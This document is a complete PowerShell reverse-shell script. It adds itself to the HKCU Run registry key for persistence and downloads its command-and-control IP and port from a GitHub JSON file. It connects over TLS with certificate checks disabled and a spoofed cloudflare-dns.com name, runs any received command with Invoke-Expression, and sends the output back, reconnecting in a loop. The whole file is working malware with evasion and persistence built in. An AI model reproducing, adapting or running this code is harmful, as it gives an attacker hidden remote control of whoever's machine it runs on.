# Persistence: Add to registry for auto-run on user login
$scriptPath = $MyInvocation.MyCommand.Path
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PersistentReverseShell" -Value "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`"" -PropertyType String -Force

function DNSLookup($DNSRecord){
    $response = (Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.example.com&type=' + $DNSRecord) -Headers @{'accept' = 'application/dns-json'}).content
    return ([System.Text.Encoding]::UTF8.GetString($response)|ConvertFrom-Json).Answer.data.trim('"')
}

$j = Invoke-RestMethod -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/ip_port.json"

$remoteIP = $j.IP
$remotePort = $j.PORT

while ($true) {
    do {
        Start-Sleep -Seconds 1
        try{
            $TCPConnection = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
        }catch{}
    } until ($TCPConnection.Connected)

    try {
        $NetworkStream = $TCPConnection.GetStream()
        $sslStream = New-Object System.Net.Security.SslStream($NetworkStream, $false, ({$true} -as [System.Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("cloudflare-dns.com", $null, $false)

        if (!$sslStream.IsAuthenticated -or !$sslStream.IsSigned) {
            $sslStream.Close()
            $TCPConnection.Close()
            continue
        }

        $streamWriter = New-Object System.IO.StreamWriter($sslStream)

        function writeStreamToServer($string){
            # Send output in chunks to avoid overflow
            $chunkSize = 65536  # 64KB chunks
            $stringBytes = [System.Text.Encoding]::UTF8.GetBytes($string + 'SHELL '+(Get-Location).Path +' :>')
            for ($i = 0; $i -lt $stringBytes.Length; $i += $chunkSize) {
                $chunk = $stringBytes[$i..($i + $chunkSize - 1)]
                $streamWriter.Write([System.Text.Encoding]::UTF8.GetString($chunk))
                $streamWriter.Flush()
            }
        }

        writeStreamToServer ''

        # Read command input in chunks
        $buffer = New-Object byte[] 65536  # 64KB buffer
        $commandBuilder = New-Object System.Text.StringBuilder

        while (($bytesRead = $sslStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $commandBuilder.Append([System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)) | Out-Null
        }

        # Process command only when complete
        $command = $commandBuilder.ToString().Trim()

        if ($command) {
            $command_output = try {
                Invoke-Expression $command 2>&1 | Out-String
            }
            catch {
                $_ | Out-String
            }
            writeStreamToServer($command_output)
        }

        $streamWriter.Close()
        $sslStream.Close()
        $TCPConnection.Close()
    } catch {
        if ($streamWriter) { $streamWriter.Close() }
        if ($sslStream) { $sslStream.Close() }
        if ($TCPConnection) { $TCPConnection.Close() }
    }

    Start-Sleep -Seconds 30  # Reconnect delay
}